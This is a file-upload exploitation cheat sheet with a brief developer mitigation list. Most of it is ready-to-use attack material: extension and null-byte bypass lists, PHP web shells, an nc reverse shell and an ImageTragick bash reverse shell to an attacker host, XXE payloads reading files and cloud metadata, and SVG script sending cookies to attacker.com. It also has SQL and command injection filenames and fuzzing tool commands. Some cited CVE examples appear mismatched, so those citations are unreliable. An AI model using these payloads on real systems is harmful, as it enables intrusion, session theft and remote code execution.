# File Upload Ultimate Checklist & Exploitation Guide

## 1. File Name Validation Bypasses

### Blacklisted Extensions (Blocked by Default)

**PHP:**
`.phtm`, `.phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`

**ASP:**
`.asp`, `.aspx`, `.cer`, `.asa`

**JSP:**
`.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`

**ColdFusion:**
`.cfm`, `.cfml`, `.cfc`, `.dbm`

**Random capitalization bypass example:**
`.pHp`, `.pHP5`, `.PhAr`, `.pHTmL`

### Whitelisted Extensions (Allowed)

```
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.
.html
```

### Real-World Example: Null Byte Injection (PHP < 5.3.4)
**Vulnerable code:**
```php
$filename = $_FILES['file']['name'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if($ext == "jpg") move_uploaded_file($_FILES['file']['tmp_name'], "uploads/".$filename);
```
**Exploit:**
Upload `shell.php%00.jpg`. The server sees `.jpg` but saves as `shell.php` due to null byte termination.

**Result:** Remote Code Execution (RCE).

---

## 2. Content-Type Bypass

Change `Content-Type` header while preserving malicious extension.

**Normal request:**
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
...
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php
```

**Bypass:**
```
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```

### Real-World Example: WordPress Plugin Upload Bypass (CVE-2015-5622)
Some plugins only checked `Content-Type` and not the actual file content. Attackers uploaded `.php` files with `Content-Type: image/png` and gained RCE.

---

## 3. Content-Length & Small Payloads

Small payload to evade size-based detection:
```php
<?='$_GET[x]'?>
```
Executes system commands via:
```
http://target.com/uploads/shell.php?x=system('id');
```

**Real-World Example:** CTF比赛中常见，通过极短payload绕过长度限制。

---

## 4. Impact by File Extension

| Extension | Impact | Real-World Example |
|-----------|--------|--------------------|
| `.asp`, `.aspx`, `.php`, `.php5`, `.php3` | Web Shell, RCE | CVE-2017-9841 (PHPUnit RCE) |
| `.svg` | Stored XSS, SSRF, XXE | CVE-2019-11881 (WhatsApp SVG XSS) |
| `.gif` | Stored XSS (via metadata/comments) | CVE-2020-11890 (Joomla GIF XSS) |
| `.csv` | CSV Injection (Formula Injection) | CVE-2018-1000861 (Jenkins CSV Injection) |
| `.xml` | XXE (Local file read, SSRF) | CVE-2019-10173 (XWiki XML upload) |
| `.avi`, `.mp4` | LFI (via malicious metadata), SSRF | CVE-2018-1335 (Apache Tika SSRF) |
| `.html`, `.js` | HTML Injection, XSS, Open Redirect | CVE-2020-11023 (jQuery XSS via HTML upload) |
| `.png`, `.jpg` | Pixel Flood DoS | CVE-2018-25032 (zlib bomb) |
| `.zip` | RCE via Zip Slip, DoS | CVE-2018-1002200 (ZipSlip in many apps) |
| `.pdf`, `.pptx` | SSRF, Blind XXE | CVE-2019-17187 (Odoo PDF XXE) |

---

## 5. Path Traversal via Filename

Upload with traversal in filename to overwrite or write outside intended directory.

**Examples:**
```
../../etc/passwd/logo.png
../../../logo.png
../../var/www/html/shell.php
..\..\config.php
```

**Real-World Example:** CVE-2018-13324 (Froxlor upload path traversal)

**Exploit:** Upload `../../../../var/www/html/shell.php` as filename. If server concatenates upload path with filename, you can write anywhere.

**Mitigation:** Sanitize `../` and `..\`, use `basename()`.

---

## 6. SQL Injection via Filename

If filename is stored in database without sanitization:

**Payloads:**
```
'sleep(10).jpg
sleep(10)-- -.jpg
' OR '1'='1' -- -.jpg
' UNION SELECT username,password FROM users -- .jpg
```

**Real-World Example:** Some CMS store filenames in DB and use in queries directly. Blind SQLi achievable via time-based `sleep()`.

---

## 7. Command Injection via Filename

If server executes system commands using filename (e.g., `convert`, `ffmpeg`, `unzip`):

**Payloads:**
```
; sleep 10;
| sleep 10;
$(sleep 10)
`sleep 10`
; nc -e /bin/sh attacker-ip 4444;
```

**Real-World Example:** CVE-2016-3714 (ImageMagick) – See ImageTragick below.

---

## 8. ImageTragick (CVE-2016-3714)

**Vulnerable ImageMagick versions:** < 6.9.3-10

**Malicious SVG or MVG file:**
```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

**Real-World Exploit:** Upload as `.jpg`, `.svg`, `.mvg`. When ImageMagick processes it, command executes.

**Check for ImageMagick:** Upload a normal image and see if `identify` or `convert` is mentioned in response headers/errors.

---

## 9. XXE via SVG Upload

**Basic XXE (Read local file):**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

**XXE with SSRF:**
```xml
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg>&xxe;</svg>
```

**XXE via expect (if PHP expect module enabled):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
  <image xlink:href="expect://ls"></image>
</svg>
```

**Real-World Example:** CVE-2019-11881 (WhatsApp XXE via SVG profile photo).

---

## 10. XSS via SVG Upload

**Simple alert:**
```svg
<svg onload=alert(document.domain)>
```

**Full SVG XSS:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert("XSS via SVG upload");
    fetch('https://attacker.com/steal?cookie='+document.cookie);
  </script>
</svg>
```

**Real-World Example:** CVE-2020-11023 (jQuery allowed SVG XSS via upload).

---

## 11. Open Redirect via SVG

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
```

---

## 12. Filter Bypassing Techniques (Detailed)

### 12.1. Double Extension
- `shell.php.jpg` – if regex checks only last extension
- `shell.jpg.php` – if regex checks first extension only

### 12.2. Case Randomization (Windows + Apache misconfig)
- `shell.PhP`
- `shell.PHP5`
- `shell.pHp`

### 12.3. Null Byte Injection (PHP < 5.3.4, old Tomcat)
- `shell.php%00.jpg`
- `shell.php\x00.jpg`

### 12.4. Newline, Space, and Dot Bypasses
- `shell.php.` (Windows ignores trailing dot)
- `shell.php%20` (space)
- `shell.php%0d%0a.jpg`
- `shell.php.....`

### 12.5. Slash Bypass (Apache misconfig)
- `shell.php/`
- `shell.php.\`

### 12.6. ASP bypass on IIS
- `.cer`, `.asa`, `.cdx`, `.htr`

### 12.7. Magic Number Bypass (Double image)
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```
Save as `shell.php` with `Content-Type: image/gif`.

### 12.8. Zip + Rename Trick
If developer checks extension but unzips via command:
Rename `shell.php` → `pwd.jpg` inside zip. After upload, app unzips and executes.

### 12.9. SQL Injection via filename in DB
`'sleep(10)-- -.jpg`

---

## 13. Advanced Bypassing Techniques

### 13.1. ImageTragick (ImageMagick)
**Full write-up:** [mukarramkhalid.com/imagemagick-imagetragick-exploit](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)  
**Tool:** [gifoeb by neex](https://github.com/neex/gifoeb)

**Exploit steps:**
1. Create malicious GIF or MVG
2. Upload as image
3. ImageMagick processes and executes command

### 13.2. GD Library Bypass
GD ignores metadata, but if app uses `imagecreatefromjpeg` + `imagejpeg` without validation, you can still embed PHP in comment.

### 13.3. FFmpeg SSRF & LFI (CVE-2016-6670)
Upload malicious `.avi` or `.m3u8` with:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/
```

---

## 14. File Upload Tools

| Tool | Purpose | Command |
|------|---------|---------|
| [fuxploider](https://github.com/almandin/fuxploider) | Automated bypass fuzzing | `python3 fuxploider.py --url https://example.com --not-regex "wrong file type"` |
| [upload_bypass](https://github.com/sAjibuu/upload_bypass) | Extension & content-type fuzzing | `python upload_bypass.py -u https://example.com -f shell.php` |
| Burp Suite Intruder | Manual fuzzing | Use payload lists for extensions, null bytes, case |
| [magic_byte_bypass.py](https://gist.github.com/notsoshant) | Add magic bytes to any file | |

---

## 15. Cheatsheet Quick Reference

```
upload.random123            → Test random extensions
upload.php                  → Basic PHP test
upload.php.jpeg             → Double extension bypass
upload.jpg.php              → Reverse double extension
upload.php (change Content-Type to image/jpeg) → MIME bypass
upload.php*                 → Version 1-7 bypass
upload.PHP / .PhP / .pHp    → Case bypass
upload .htaccess            → Make .jpg run as PHP
pixelFlood.jpg              → DoS (large dimensions)
frameflood.gif              → 10^10 frames DoS
Malicious zTXT in UBER.jpg  → Metadata XSS
Upload zip file             → Zip Slip test
Check Overwrite Issue       → Same filename overwrite
SVG to XSS                  → Upload SVG with <script>
SQLi Via File upload        → 'sleep(10)-- -.jpg
Command injection           → ; sleep 10;
```

---

## 16. Real-World Attack Scenarios

### Scenario 1: Profile Picture Upload (XSS + SSRF)
- **App:** Social media platform
- **Vulnerability:** SVG upload allowed, no sanitization
- **Exploit:** Upload SVG with `<script>fetch('https://attacker.com?cookie='+document.cookie)</script>`
- **Impact:** Stored XSS, session hijacking

### Scenario 2: Resume Upload (XXE + SSRF)
- **App:** Job portal accepting `.docx`, `.pdf`, `.xml`
- **Vulnerability:** XML parser not disabled
- **Exploit:** Upload `.xml` or crafted `.docx` with XXE payload
- **Impact:** Read `/etc/passwd`, SSRF to internal metadata endpoint

### Scenario 3: ZIP Upload (RCE via Zip Slip)
- **App:** Theme/plugin uploader for CMS
- **Vulnerability:** Extracts ZIP without sanitizing paths
- **Exploit:** Create `evil.zip` containing `../../../../var/www/html/shell.php`
- **Impact:** RCE

### Scenario 4: Image Upload with ImageMagick (CVE-2016-3714)
- **App:** Image resizer using ImageMagick
- **Vulnerability:** Old ImageMagick version
- **Exploit:** Upload `.jpg` with ImageTragick payload
- **Impact:** Command execution, reverse shell

### Scenario 5: CSV Injection
- **App:** Admin panel exports user data to CSV, admin opens in Excel
- **Exploit:** Upload CSV with `=cmd|'/C calc'!A0` in a field
- **Impact:** RCE on admin's machine when opening CSV

---

## 17. Mitigation Recommendations (For Developers)

1. **Whitelist extensions only** – never blacklist
2. **Rename uploaded files** – use UUID + correct extension
3. **Validate file content** – not just `Content-Type` header
4. **Disable script execution** in upload directory via `.htaccess` or equivalent
5. **Sanitize filename** – remove `../`, null bytes, special chars
6. **Use `finfo_file()`** (PHP) or equivalent MIME type detection
7. **Disable XML external entities** for SVG, XML, DOCX, XLSX
8. **Keep ImageMagick, GD, FFmpeg updated**
9. **Never pass filename to system commands without escaping**
10. **Store files outside webroot** and serve via script with whitelist

---

## 18. Testing Checklist Summary

- [ ] Try all blacklisted extensions with case variations
- [ ] Test double extensions (`file.php.jpg`, `file.jpg.php`)
- [ ] Test null byte (`file.php%00.jpg`)
- [ ] Test trailing dot, space, newline
- [ ] Test path traversal in filename
- [ ] Test SQLi in filename
- [ ] Test command injection in filename
- [ ] Upload SVG with XSS, XXE, SSRF payloads
- [ ] Upload GIF with magic number + PHP
- [ ] Upload ZIP for Zip Slip
- [ ] Upload large image for DoS
- [ ] Upload CSV with formula injection
- [ ] Upload XML with XXE
- [ ] Test overwrite vulnerability
- [ ] Test ImageTragick if ImageMagick detected

---
